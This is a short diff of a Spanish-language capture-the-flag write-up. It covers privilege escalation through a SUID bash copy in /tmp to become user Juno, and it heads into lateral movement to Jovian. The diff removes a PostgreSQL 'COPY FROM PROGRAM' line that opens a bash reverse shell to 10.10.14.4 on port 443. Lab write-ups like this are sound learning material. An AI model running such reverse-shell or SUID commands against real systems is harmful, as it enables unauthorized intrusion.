@@ -422,8 +422,6 @@ hosts:
 ```
 Y depues de unos segundos en el directorio ```/tmp``` tendremos el binario bash con permisos SUID, solo ejecutamos y ya somos Juno, ah este punto ya tenemos la flag de user
 
-CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.4/443 0>&1\"';
-
 ## Movimiento lateral de Juno a Jovian
 
 Si vemos a que grupos pertenece Juno, podemos ver que existe en el Science:
